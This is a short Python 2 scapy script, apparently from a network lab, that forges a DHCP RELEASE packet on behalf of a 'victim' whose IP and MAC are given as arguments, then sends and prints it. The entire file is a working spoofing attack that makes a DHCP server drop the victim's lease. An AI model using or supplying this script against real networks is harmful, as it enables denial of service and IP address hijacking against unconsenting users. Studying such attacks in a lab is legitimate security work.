from scapy.all import *
import random

servIp = int(sys.argv[3])
localiface = 'h1-eth0'
broadcastMac = 'ff:ff:ff:ff:ff:ff'
broadcastIp = '255.255.255.255'

if servIp < 3:
    dhcpIp = "192.168.0.254"
else:
    dhcpIp = "11.22.33.44"

vicIp = sys.argv[1]
vicMac = sys.argv[2]

vicMacRaw = vicMac.replace(':','').decode('hex')


ethPk = Ether(src=vicMac, dst=broadcastMac)
ipPk = IP(src=vicIp, dst= dhcpIp)
udpPk = UDP(dport=67,sport=68)
curXid = random.randint(0,10000)
bootPk = BOOTP(chaddr = vicMacRaw, ciaddr = vicIp,xid = curXid)
if servIp > 2:
    dhcpPk = DHCP(options=[('message-type', 'release'),('server_id', dhcpIp), 'end'])
else:
    dhcpPk = DHCP(options=[('message-type', 'release'), 'end'])
    
release = ethPk/ipPk/udpPk/bootPk/dhcpPk
            
recvPk = sendp(release,iface=localiface)

print "\n*****"
print release.display()
print "\n******\n"
